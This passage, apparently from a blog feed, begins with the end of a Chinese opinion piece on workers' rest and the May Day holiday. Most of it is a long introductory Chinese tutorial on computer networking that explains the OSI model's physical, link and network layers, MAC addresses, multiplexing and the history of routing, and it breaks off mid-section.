他们只是机器。休息的时间是什么？表象是为再生产提供蓄力，本质则是一份人权的落地，是民本之自由的一部分。 工人理应享有休息与定义休息的权力。 自由一旦被禁锢，其实对于规模化生产也是弊大于利的。这也是诸多行业眼下产生“内卷”现象的缘由之一，所以我说这种调休制度实为反动。 如果还是回到大的宏观角度而论，阶级的自由如果被锁缚，则必将羁绊这个阶级的前进步伐。 仍以列宁的观点为导：“资产阶级利用自由，是为了高枕无忧；无产阶级需要自由，是为了更广泛地开展争取社会主义的斗争。”（《地方自治局的迫害者和自由主义的汉尼拔》） 前天4月22日是列宁151周年的纪念日，舆论追忆声浪寥寥；而近日一则“工人讨生活费被喷辣椒水”的新闻，流量同样被压低埋没…… 五一国际劳动节在即，这个为劳动者唱赞歌的政治节日倒是因为对劳动者极不友好的放假现状而登上了热搜，这太过讽刺了。 ","link":"https://blog.gd1214b.icu/post/UdDINeaAU/"},{"title":"计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”","content":" 版权声明 本博客所有的原创文章，作者皆保留版权。转载必须包含本声明，保持本文完整，并以超链接形式注明作者编程随想和本文原始地址： https://program-think.blogspot.com/2021/03/Computer-Networks-Overview.html 本文的目标读者 今天这篇的标题是“扫盲”，也就是说：即使那些完全不懂 IT 领域，也不懂通讯领域的读者，依然能看懂（至少能看懂一部分）。为了做到这点，俺会尽量使用通俗的比喻，并适当加一些示意图。 另外，就算你已经比较了解网络通讯领域，本文中提到的某些部分，也可能是你所不知道的。也就是说：懂行的同学，看看此文，也会有帮助。 本文的标题特地强调了【系统性】——俺希望这篇教程能帮助读者对“计算机网络”这个领域进行系统性学习（何为“系统性学习”？请看这篇教程） 为了做到【系统性】这个目的，这篇教程很长。俺开博12年，这篇的长度估计能排到前5名。建议大伙儿慢慢看，不要着急。 基本概念 为了足够通俗，俺先要介绍一些基本概念。 信道（channel） 这是通讯领域非常基本的概念，肯定要先聊聊它。 通俗地说，信道就是“传送信息的通道”。 信道的类型 首先，信道可以从广义上分为“物理信道 ＆ 逻辑信道”。 顾名思义，“物理信道”就是直接使用某种【物理介质】来传送信息；至于“逻辑信道”——是基于“物理信道”之上抽象出来的玩意儿（待会儿讲到“协议栈”的时候再聊）。 信道的带宽 “带宽”指的是：某个信道在单位时间内最大能传输多少比特的信息。 请注意： 电气领域 ＆ 计算机领域都有“带宽”这个概念，但两者的定义不太一样。电气领域所说的“带宽”指的是“模拟带宽”，单位是“赫兹/Hz”；计算机领域所说的“带宽”指“数字带宽”，单位是“比特率”或“字节率”。 后续章节提到“带宽”，都是指计算机领域的术语。 带宽的单位——容易把外行绕晕 “比特率”或“字节率”很容易搞混淆。用英文表示的话——大写字母 B 表示【字节】；小写字母 b 表示【比特】。 由于带宽的数字通常很大，要引入“K、M、G”之类的字母表示数量级，于是又引出一个很扯蛋的差异——“10进制”与“2进制”的差异。 【10进制】的 K 表示 1000；M 表示 1000x1000（1百万） 【2进制】的 K 表示 1024（2的10次方）；M 表示 1024x1024（2的20次方） 为了避免扯皮，后来国际上约定了一个规矩：对【2进制】的数量级要加一个小写字母 i。比如说：Ki 表示 1024；Mi 表示 1024x1024 ...... 以此类推。 举例： 1Kbps 表示“1000比特每秒” 1KiBps 表示“1024字节每秒” 信道的工作模式：单工 VS 半双工 VS 全双工 再来说说信道的工作模式。大致可以分为如下三种。为了让大伙儿比较好理解，俺对每一种都举相应的例子。 1. 单工（simplex） 比如“电台广播”就是典型的【单工】。“电台”可以发信号给“收音机”，但“收音机”【不能】发信号给“电台”。 2. 半双工（half-duplex） 比如“单条铁路轨道”，就是典型的【半双工】。火车在单条铁轨上，可以有两种运行方向；但对于同一个瞬间，只能选其中一个方向（否则就撞车了）。 3. 全双工（full-duplex） 比如“光纤”就是典型的【全双工】。在同一根光导纤维中，可以有多个光束【同时相向】传播，互相不会干扰对方。 端点 为了叙述方便，俺把参与通讯的对象（主体）称作“通讯端点”，简称“端点”。 这里的“端点”是广义的，可以是硬件（比如某个网卡），也可以是软件（比如某个应用程序）。 通讯协议（protocol） 所谓的“通讯协议”就是：参与通讯的各方所采用的某种【约定】。只有大家都遵守这个约定，才有可能相互传递信息。 打个比方：如果两个人要用自然语言交流，前提是：双方使用相同（或相互兼容）的自然语言。 “通讯协议”就类似某种自然语言，参与通讯的多个端点，都必须能理解这个语言。 从“分层”到“参考模型” 分层 在聊“分层”之前，先说说“分工”。比如在一个公司中，通常设有不同的工种/岗位，这就【分工】。 对于网络通讯也是如此，不太可能用一种通讯协议完成所有的信息传递任务（注：对于特别简单的网络，或许有可能只用单一协议；但如今的网络通讯已经很复杂，用【单个】通讯协议包办所有事情，已经不太可能） 一旦采用了多种通讯协议，这几种协议之间，该如何配合捏？ 在网络通讯领域，采用的是【分层】的设计思路。多个层次的协议在一起协同工作，技术上称作“协议栈”（洋文叫做“protocol stack”）。 协议栈的原理 对于多层次的协议栈。每个层次都有各自的“端点”（进行通讯的主体）。处于【同一层次】的两个端点会使用该层次的协议进行通讯（注：同一个层次的协议，可能只有一个，也可能有多个）。 除了最顶层，每个层次的端点会向其【直接】上层提供“服务”；除了最底层，每个层次的端点会调用【直接】下层提供的“服务”（这里所说的“服务”指某种“编程接口”，技术行话叫 API）。 逻辑信道 （前一个小节说了）每个层次会向上一个层次提供服务（API 调用）。对上层而言，调用下层提供的 API 发送信息，其效果相当于在使用某种【信道】进行通讯，这也就是俺在 ★基本概念 那个章节所说的“逻辑信道”。 数据格式的原理 大部分协议会把要传送的数据切割为 N 份，每一份就是一个数据包。 通常来说，数据包的格式有如下三部分： 头部 身体（也称作“有效载荷”） 尾部（注：很多协议没有尾部） 如果你收过快递，可以把“网络数据包”与“快递包裹”作一个对照—— 数据包的“头/尾”，就类似于快递包裹的【包装袋】。数据包的“身体”，就类似于快递包裹里面的东西。 对于【相邻】两层的协议，【下】层包含【上】层。也就是说：下层协议的【载荷】就是上层协议的【整体】。 还是以快递举例： 假设你从网上买了一台笔记本电脑。电脑出厂时，电脑厂商肯定会提供一个包装盒。快递公司在寄送这台笔记本的时候，又会在笔记本的盒子外面再加一个包装袋。对应到网络协议——“快递公司的包装袋”相当于【下层】协议；“电脑厂商的包装盒”，相当于【上层】协议。 网络分层的参考模型 上述所说的“分层 ＆ 协议栈”只是一个抽象的（笼统的）思路。具体要分几层？每一层要干啥事儿？这些都是很有讲究滴！网络技术发展了几十年，已经有很多牛人提出了各种不同的划分方案，称之为“网络分层的参考模型”（为了打字省力，以下简称“模型”）。 在各种模型中，名气最大的当然是“OSI 模型”（洋文称作“OSI model”）。在后续的章节中，俺会以这个模型为主体，进行介绍。 除了“OSI 模型”还有一个很出名的模型是“TCP/IP 模型”（因为互联网很成功，它才跟着出名）。 对“TCP/IP 模型”的分层，不同的文章或书籍，说法不太一样（“3层、4层、5层”皆有），这就引发了一些争议。包括几位热心读者也在博客留言，表达不同意见。为了避免一家之言，贴出维基百科的“这个链接”，其中给出了几种比较有名的说法。 另外，俺想提醒一下： 由于本文是基于【OSI 模型】进行展开。对于 TCP/IP 模型到底算几层，这方面的争论【不】影响本文后续的内容。 OSI 概述 OSI 的历史 OSI”的全称是“Open System Interconnection”。先说说它的历史。 上世纪70年代，“国际电信联盟”（ITU）想对各国的电信系统（电话/电报）建立标准化的规格；与此同时，“国际标准化组织”（ISO）想要建立某种统一的标准，使得不同公司制造的大型主机可以相互联网。 后来，这两个国际组织意识到：“电信系统互联”与“电脑主机互联”的性质差不多。于是 ISO 与 ITU 就决定合作，两家一起干。这2个组织的2套班子，从上世纪70年代开始搞，搞来搞去，搞了很多年，一直到1984年才终于正式发布 OSI 标准。 OSI 标准的两个组成部分 严格来讲，OSI 包括两大部分—— 其一，抽象的概念模型，也就是前面提到的【OSI model】； 其二，针对这个概念模型的具体实现（具体的通讯协议），洋文叫做【OSI protocols】。 （前面说了）OSI 是由 ISO ＆ ITU 联手搞出来滴。这两个国际组织里面的人，要么是来自各国的电信部门，要么是来自各国的高校学者。总而言之，既有严重的官僚风气，又有明显的学究风气。（正是因为这两种风气叠加，所以搞了很多年，才搞出 OSI） OSI 的协议实现（OSI protocols），不客气地说，就是一堆垃圾——据说把 OSI protocols 所有的协议文档，全部打印成 A4 纸，摞起来得有一米多高！是不是很吓人？协议搞得如此复杂，严重违背了 IT 设计领域的 KISS 原则。 由于 OSI protocols 实在太复杂，后来基本没人用。但 OSI model 反而广为流传，并且成为“网络分层模型”中名气最大，影响力最广的一个。 因此，本文后续章节中，凡是提到 OSI，指的是【OSI model】。 OSI 模型的7层 OSI 模型总共分7层，示意图参见如下表格： 考虑到本文是针对一般性读者的【扫盲教程】，俺重点聊第1~4层。搞明白这几个层次之后，有助于你更好地理解网络的很多概念，也有助于你更好地理解很多信息安全的概念。 网上已经有很多关于 OSI 的文章，可惜大部分写得粗糙——很多文章只是在照抄定义。 俺曾经写过一篇《学习技术的三部曲：WHAT、HOW、WHY》，其中提到【理解技术】的不同层次。要想更好地理解 OSI 模型，你得搞明白：为啥需要引入某某层？（请注意：这是一个 WHY 型的问题） 接下来在讨论 OSI 的每个层次时，俺都会专门写一个小节，谈该层次的【必要性】。搞明白【必要性】，你就知道为啥要引入这个层次。 物理层：概述 物理层的必要性 通俗地说：直接与物理介质打交道的层次，就是物理层。这一层的必要性比较明显。 因为所有的通讯，归根结底都要依赖于【物理介质】。与物理介质打交道，需要牵涉到很多与【物理学】相关的东东。比如：“无线电通讯”需要关心“频率/波长”；电缆通讯需要跟“电压”打交道；“光纤通讯”需要关心“玻璃的折射率＆光线的入射角” ...... “物理层”的主要职责是：屏蔽这些细节，使得“物理层”之上的层次不用再去操心物理学。 物理信道的类型 何为“物理信道”，在本文开篇的“基本概念”已经提到了。 对于“物理信道”，还可以进一步细分为如下三大类： 有线信道（比如：双绞线、同轴电缆、光纤、等等） 无线信道（比如：微波通讯、电台广播、卫星通讯、等等） 存储信道 “存储信道”比较少见，很多人没听说过，稍微解释一下。 假设你要把一大坨信息传送给另一个人，除了用“有线 or 无线”这两种通讯方式，还可以把信息先保存到某种【存储介质】（比如硬盘），然后再把存储介质用某种方式（比如快递）转交给对方。这就是所谓的“存储信道”。 信噪比（Signal-to-noise ratio） 俺在很多篇关于“学习＆心理学”的博文中提到过【信噪比】这个概念。其实这个概念是从通讯领域借用的术语。 对于“物理信道”，总是会存在某些环境干扰，称之为“噪声”（Noise）。“信道传输的有用信息”与“无用的干扰噪声”，这两者的比值就是“信噪比”。 “信噪比”单位是【分贝】。“分贝”洋文叫做“decibel”（简写为 dB）。“deci”表示“十进制”；“bel”是为了纪念大名鼎鼎的贝尔（电话它爹）。 带宽的限制因素 “物理信道”要依赖于物理传输介质。不管使用何种物理介质，都要受限于某些基本的物理学定律（比如“光速上限”）。另外，不管何种物理介质，总是会有或多或少的环境干扰（噪声）。这两个因素导致了：任何“物理信道”的最大传输率总是有限滴。 由于物理层是最底下的一层，物理层之上的其它层次总是要直接或间接地依赖【物理信道】。因此，其它层次建立的“逻辑信道”，其带宽只会比“物理信道”的最大带宽更小。换句话说：“物理信道”的带宽上限也就是整个协议栈的带宽上限。 多路复用（Multiplexing） 一般来说，凡是能实现【长距离】通讯的“物理信道”，都有相当的经济成本。比如铺设“光纤、同轴电缆”都要花钱。无线电通讯虽然免去了铺设线路的成本，但需要竞标购买频段。因此，物理信道非常强调“多路复用”。 所谓的“多路复用”，通俗地说就是：尽可能地共享物理信道，不要浪费了。 “多路复用”有很多种类型；不同的类型，原理也不同。为了展示各种不同的原理，俺拿【无线通信】来说事儿。 无线通信领域的“多路复用”，【至少】有如下几种： 1. 频分多路复用/FDM（Frequency-Division Multiplexing） 这个最简单，就是根据频率拆分。不同的线路占用不同的频段，互不干扰。（电台广播用的就是这个思路） 但这个思路的缺点很明显—— 其一，要依赖足够宽的频段（频段是稀缺资源）； 其二，不同线路的流量可能会动态变化。如果某个线路空闲，其占用的频段就浪费了。 （注：光纤通讯中有个“波分多路复用/WDM”，本质上就是 FDM） 2. 时分多路复用/TDM（Time-Division Multiplexing） 这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。 这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。 这个思路的优点是：可以只使用一个很窄的频段。缺点是：线路越多，每条线路等待越久；即使某个线路空闲，依然会占用时间片（浪费了资源）。 3. 码分多路复用/CDM（Code-Division Multiplexing） 这种思路采用某种【编码】的技巧，使得多个端点可以在同一个时间点使用同一频段发送数据；由于他们采用不同的编码方式，不会相互干扰。 一般来说，CDM 要依赖于“扩频技术”（spread spectrum），需占用一个比较宽的频道范围。这算是缺点。但其优点很明显—— 其一，可以支持 N 个线路（N 动态变化）； 其二，即使任何一个线路的流量动态变化，也不会浪费物理信道的资源。 显然，这种思路明显优于 FDM ＆ TDM。如今在移动通讯领域大名鼎鼎的 CDMA（码分多址），采用的就是这个思路。 物理层：具体实例 物理层的【协议】 物理层的协议主要有如下： USB 协议 蓝牙协议的一部分 IEEE 802.11 的一部分（Wi-Fi） IEEE 802.16（WiMAX） IEEE 1394（火线接口） RS-232 协议（串行接口/串口） ...... （考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。 物理层的【协议实现】 对于电脑主机（含移动设备），“网卡硬件”包含了物理层的协议实现（参见如下示意图） 另外，还有一些专门的【1层】网络设备，也提供物理层的功能（参见下一个小节）。 物理层相关的【网络设备】 1. 调制解调器（modem） 通俗地说，“调制解调器”就是用来翻译“数字信号 ＆ 模拟信号”。 在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。 早期的拨号上网，modem 面对的物理介质是“固话线路”；如今家庭宽带普及，光纤入户，modem 面对的物理介质是“光纤线路”。 2. 中继器（repeater） 信号在物理介质中传输，会出现【衰减】（不论是“有线 or 无线”都有可能衰减）。“中继器”的作用是【信号增益】，使得信号能传得更远。 另外，比如“微波通讯”是直线传播，而地球表面有弧度，还有地形的起伏。所以每隔一定距离要建“微波塔”。这玩意儿也相当于“中继器”。 3. 集线器（hub） 可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。 通常所说的“集线器”是指“以太网集线器”。这种设备如今已经逐步淘汰，很少见到了。 另外，很多同学应该都用过“USB hub”，就是针对 USB 线的“集线器”（“USB 线”也可以视作某种通讯介质）。 链路层：概述 链路层的必要性 对信息的打包 物理层传输的信息，通俗地说就是【比特流】（也就是一长串比特）。但是对于计算机来说，“比特流”太低级啦，处理起来极不方便。“链路层”要干的第一个事情，就是把“比特流”打包成更大的一坨，以方便更上层的协议进行处理。在 OSI 模型中，链路层的一坨，称之为“帧”（frame）。 2. 差错控制 物理介质的传输，可能受到环境的影响。这种影响不仅仅体现为“噪声”，有时候会出现严重的干扰，导致物理层传输的“比特流”出错（某个比特“从0变1”或“从1变0”）。因此，链路层还需要负责检查物理层的传输是否出错。在 IT 行话中，检测是否出错，称之为“差错控制机制”（后面有一个小节会简单说一下这个话题）。 3. 流量控制 假设两个端点通过同一个物理信道进行通讯，这两个端点处理信息的速度可能不同。如果发送方输出信息的速度超过接收方处理信息的速度，通讯就会出问题。于是就需要有某种机制来协调，确保发送方的发送速度不会超出接收方的处理速度。在技术行话中，这称之为“流量控制”，简称“流控”。 4. 信道复用 在上一个章节已经讲到：用于远距离通讯的“物理介质”，总是有成本。因此需要对物理信道进行“多路复用”，就会导致多个端点共用同一个物理信道。如果同时存在多个发送者和多个接收者。接收者如何知道某个信息是发给自己而不是别人？ 另外，某些物理介质可能不支持并发（无法同时发送信息）。某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。后续小节会聊它。 差错控制 为了发现传输的信息是否出错，设计了很多相应的数学算法。这些算法大体分为两类：“检错算法 ＆ 纠错算法”。 简而言之，“检错算法”只能检测出错误，而“纠错算法”不但能检测出错误，还能纠正错误。很显然，“纠错算法”更牛逼，但是它也更复杂。 常见的“检错算法”对传输的数据计算出一个【校验值】，接收方收到数据会重新计算校验和，如果算出来不对，就把收到的数据丢弃，让对方重发。“校验算法”的原理类似于《扫盲文件完整性校验——关于散列值和数字签名》一文中提到的“散列算法/哈希算法”。 “纠错算法”更高级，由于涉及到更多数学，俺就不展开啦。 对于【无线】物理信道，由于出错的概率更高，并且重新传输数据的成本也更高。所以【无线】通讯的链路层协议，更倾向于用【纠错】机制；作为对比，【有线】通讯的链路层协议，更倾向于用【检错】机制。 MAC 协议 “MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。为了形象，俺拿“铁路系统”来比喻，说明“MAC 协议”的用途。 假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。 首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。 所有这些协调工作，都是靠“MAC 协议”来搞定。 MAC 地址 为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。 通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。 如何保证 MAC 地址全球唯一捏？简单说一下： MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。 MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。 由于俺在很多安全教程中鼓吹大伙儿使用“操作系统虚拟机”，再顺便说说【虚拟网卡】的 MAC 地址。 “虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（224 = 16777216），碰巧一样的概率很低。 （注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题） 链路层：具体实例 链路层的【协议】 链路层的协议主要有如下： MAC 协议（介质访问控制） LLC 协议（逻辑链路控制） ARP 协议（解析 MAC 地址） IEEE 802.3（以太网） IEEE 802.11 的一部分（Wi-Fi） PPP 协议（拨号上网） SLIP 协议（拨号上网） ...... （考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。 链路层的【协议实现】 对于电脑主机（含移动设备），“网卡硬件 ＆ 网卡驱动”会包含链路层协议的实现（参见如下示意图）。 另外，还有一些专门的【2层】网络设备，也提供链路层的功能（参见下一个小节）。 链路层相关的【网络设备】 1. 网络交换机（network switch） （注：一般提到“网络交换机”，如果不加定语，指的就是“2层交换机”；此外还有更高层的交换机，在后续章节介绍） 为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。 以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【1层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有4台电脑（A、B、C、D）都连在集线器上，A 发数据给 B，其实 C ＆ D 也都收到 A 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“10兆”，所以集线器虽然低效，还能忍受。 后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。 交换机是工作在2层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。 由于交换机能识别2层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。 2. 网桥/桥接器（network bridge） “交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。 下面以“操作系统虚拟机”来举例（完全没用过虚拟机的同学，请跳过这个举例）。 在这篇博文，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【bridge 模式】。一旦设置了这种模式，Guest OS 的虚拟网卡，对于 Host OS 所在的外部网络，是【双向】可见滴。也就是说，物理主机所在的外部网络，也可以看见这块虚拟网卡。 现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？ 奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。 这种网卡模式之所以称作“bridge 模式”，原因就在于此。 链路层相关的【软件工具】 嗅探抓包工具（Sniffer） 要了解链路层的数据包结构，需要用到“嗅探工具”。这类工具能捕获流经你网卡的所有【链路层】数据包。前面聊“协议栈”的时候说过：下层数据包的载荷就是上层数据包的整体。因此，拿到【链路层】数据包也就意味着：你已经拿到2层之上的所有数据包的信息了。 有些抓包工具自带图形界面，可以直接显示数据包的内容给你看。还有些只提供命令行（只是把获取的数据包保存为文件），然后要搭配其它图形化的工具来展示数据包的内容。 抓包的工具有很多，名气最大的是 Wireshark（原先叫做 Ethereal）。 2. ARP 命令 首先，ARP 是“MAC 地址解析协议”的洋文名称。该协议根据“IP 地址”解析“MAC 地址”。 Windows 自带一个同名的 arp 命令，可以用来诊断与“MAC 地址”相关的信息。比如：列出当前子网中其它主机的 IP 地址以及对应的 MAC 地址。这个命令在 Linux ＆ Mac OS 上也有。 (未完待续...) 网络层：概述 网络层的必要性 路由机制（routing） 在 OSI 模型中，链路层本身【不】提供路由功能。你可以通俗地理解为：链路层只处理【直接相连】的两个端点（注：这么说不完全严密，只是帮助外行理解） 对于某个复杂网络，可能有很多端点，有很复杂的拓扑结构。当拓扑足够复杂，总有一些端点之间【没有直连】。那么，如何在这些【没有直连】的端点之间建立通讯捏？此时就需要提供某种机制，让其它端点帮忙转发数据。这就需要引入“路由机制”。 为了避免把“链路层”搞得太复杂，路由机制放到“链路层”之上来实现，也就是“网络层”。 基于【路由】的地址编码方式 链路层已经提供了某种全球唯一的地址编码方式（MAC 地址）。但“MAC 地址”有如下几个问题： 其一，它是固定的（虽然可以用技术手段去修改 MAC 地址，但很少这么干） 其二，MAC 地址的编码是基于【厂商】，无法体现网络拓扑结构。或者说，“MAC 地址”对于“路由机制”是不够友好滴。 因此，需要引入一种更抽象（更高层）的地址，也就是“网络层地址”。咱们常说的“IP 地址”，是“网络层地址”的实现方式之一。 为了帮你理解，举个例子： 每个人都有身份证号（这就类似于“MAC 地址”）。当某人加入了某个公司，公司会为此人再分配一个“员工号”（这就类似于“网络地址”）。既然有身份证号，为啥公司还要另搞一套“员工编号”捏？因为“员工编号”有额外的好处。比如说：可以把员工号划分为不同的区间，对应不同的部门。这样一来，只要看到员工号，就知道此人来自哪个部门。 类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。 2. 网际互联（internetwork） 引入“网络层”的另一个目的是：屏蔽不同类型的网络之间的差异，从而有利于【网际互联】（也就是建立“网络的网络”）。 一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。 假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。 反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。 如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。 网络拓扑（network topology） 网络的拓扑结构有很多种，有简单的，有复杂的。一般来说，再复杂的拓扑，也可以逐步分解为若干简单拓扑的组合。 对拓扑的研究，有专门一个数学分支（拓扑学）。考虑到本文只是扫盲，俺不可能再去聊“拓扑学”。因此，只挑几种简单的拓扑结构，让大伙儿有个直观的印象。 以下是几种常见的拓扑结构 如今的互联网，整体的拓扑结构超级复杂。但还是可以逐步分解为上述几种基本的拓扑结构。 互联网的拓扑——从“历史”的角度看其健壮性 上面那张图可以看出：互联网拓扑的【局部】有很多是“星形拓扑”（当然也有其它的）。但从【宏观】上看，更像是“网状拓扑”。 在现实生活中，对于复杂结构，通常都会采用“树状层次结构”，以便于管理。比如：域名系统、公司组织结构、官僚系统 ...... 那为啥互联网的【宏观】拓扑结构是“网状”捏？这就要说到互联网的历史。 在上世纪50年代（冷战高峰期），美国军方的指挥系统高度依赖于电信公司提供的电话网络。当时的电话网络大致如下—— 在基层，每个地区有电话交换局，每一部电话都连入当地的交换局。 在全国，设有若干个长途局，每个交换局都接入某个特定的长途局（不同地区的交换局通过长途局中转）。 简而言之，当时美国的电话网络是典型的【多级星形拓扑】。这种拓扑的优点是：简单、高效、便于管理；但缺点是：健壮性很差。从这个案例中，大伙儿可以再次体会到“效率”与“健壮性”之间的矛盾。 话说1957年的时候，苏联成功试射第一颗洲际弹道导弹（ICBM），美国军方开始担心：一旦苏联先用洲际导弹攻击美国，只要把少数几个长途局轰掉，军方的指挥系统就会瘫痪。也就是说，“长途局”已经成为美国军方的【单点故障】（何为“单点故障”？参见这篇博文）。 1960年，美国国防部找来大名鼎鼎的兰德公司进行咨询，要求提供一个应对核打击的方案。该公司的研究员 Paul Baran 设计了一个方案，把“星形拓扑”改为【网状拓扑】。采用【网状拓扑】的好处在于：即使发生全面核大战，大量骨干节点被摧毁，整个网络也不会被分隔成几个孤岛，军方的指挥系统依然能正常运作。 有了兰德公司的方案，美国军方找到当时最大的电信公司 AT＆T，想要实现这个系统，结果被否决了。AT＆T 高层认为：搞这样一种系统根本不切实际。于是 Baran 的方案中途夭折。 为啥 AT＆T 反对这个方案捏？一方面，成功的大公司总是有很强的思维定势（关于这点，参见这篇文章）；另一方面，Baran 的设计方案确实很超前——其前瞻性不仅包括“拓扑结构”，而且把当时电信行业的几大核心观念完全颠覆掉了（具体如何颠覆，后续章节还会再聊）。 时间一晃又过了好多年，到了60年代末，由于一系列机缘巧合，英国佬发现了“Baran 方案”的价值，并据此搞了一个小型的 NPL 网络（NPL 是“国家物理实验室”的缩写）。然后在某次 ACM 会议上，美国佬看到英国佬的论文，才意识到：Baran 方案完全可行。经历了“出口转内销”的命运之后，该方案重新被美国国防部重视。之后，（国防部下属的）“高级计划研究局”（ARPA）开始筹建“阿帕网”（ARPANET），才有了如今的互联网。 路由的大致原理 聊完“拓扑”，再来聊“路由”。 当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤： 1. A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。 如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。 （此处所说的“网关”指“3层网关/网络层网关”） 2. 对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。 也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。 （万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错） 3. 当数据到达某个路由器之后，有如下几种可能—— 3.1 该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦； 3.2 亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） ...... 如此循环往复，最终到达目的地 B。 3.3 还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。 通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。 对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？ 这时候，“路由算法”就体现出价值啦—— 一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。 上面这段话看起来好像很简单，其实路由算法挺复杂滴。考虑到本文是“扫盲性质”，而且篇幅已经很长，不可能再去聊“路由算法”的细节。对此感兴趣的同学，可以去看《计算机网络》的第5章。 路由算法的演变史（以互联网为例） 技术菜鸟可以跳过这个小节） 由于互联网的 IP 协议已经成为“网络层协议”的事实标准，俺简单聊一下互联网的路由机制是如何进化滴。 第1阶段：静态全局路由表 